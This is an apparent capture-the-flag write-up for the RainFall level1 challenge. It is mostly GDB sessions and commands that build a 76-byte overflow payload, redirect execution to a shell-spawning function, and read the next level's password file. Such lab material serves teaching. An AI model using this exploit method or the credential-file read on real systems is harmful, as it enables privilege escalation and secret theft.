Here is a detailed README for the `level1` exploit using a buffer overflow with the help of the [Buffer Overflow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

---

# Level1 Exploit

## Description

This guide explains how to exploit a buffer overflow vulnerability in the `level1` program. The goal is to redirect the execution flow to a specific function `run` that launches a shell.

## Prerequisites

- Access to the `level1` executable.
- Tools: GDB, Python, and access to the [Buffer Overflow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

## Exploitation Steps

### 1. Initial Analysis

List the files in the directory:

```bash
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

### 2. Program Execution

Observe the program behavior with different inputs:

```bash
level1@RainFall:~$ ./level1
a
level1@RainFall:~$ ./level1 test
423
```

### 3. Analysis with GDB

Use GDB to examine the defined functions:

```bash
level1@RainFall:~$ gdb level1
(gdb) info functions
...
0x08048444  run
0x08048480  main
...
```

Identify the address of the `run` function: `0x08048444`.

### 4. Finding the Offset

Generate a pattern with the Pattern Generator to identify the offset:

- Go to [Buffer Overflow Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
- Generate a pattern of 80 characters: `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac`.

Create an exploit file:

```bash
level1@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac" > /tmp/pattern
```

Run the program with GDB:

```bash
(gdb) r < /tmp/pattern
```

Once the program crashes (segfault), you get the EIP value:

```bash
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

Use the pattern on the [site](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to find the offset. For example, if `0x63413563` corresponds to an offset of 76.

### 5. Creating the Exploit

Create an exploit file with the correct padding and the address of `run`:

```bash
level1@RainFall:~$ python -c 'print("A" * 76 + "\x44\x84\x04\x08")' > /tmp/exploit
```

### 6. Executing the Exploit

Use `cat -` to keep stdin open:

```bash
level1@RainFall:~$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

### Explanation

1. **Pattern Generator**: Used to generate a unique and identifiable pattern, allowing you to find the exact offset where the overflow occurs.
2. **Offset**: Identified at 76, meaning 76 characters fill the buffer up to the EIP.
3. **Payload**: Consists of 76 'A's followed by the address of `run` in little-endian format (`\x44\x84\x04\x08`).
4. **Cat - |**: Keeps stdin open, allowing the launched shell to remain interactive.

## Conclusion

By following these steps, you have successfully exploited a buffer overflow vulnerability to gain shell access on `level1`. This technique uses pattern generation tools and basic knowledge of stack operations and instruction pointers.

---

This README guides you through all the necessary steps to reproduce and understand the exploit.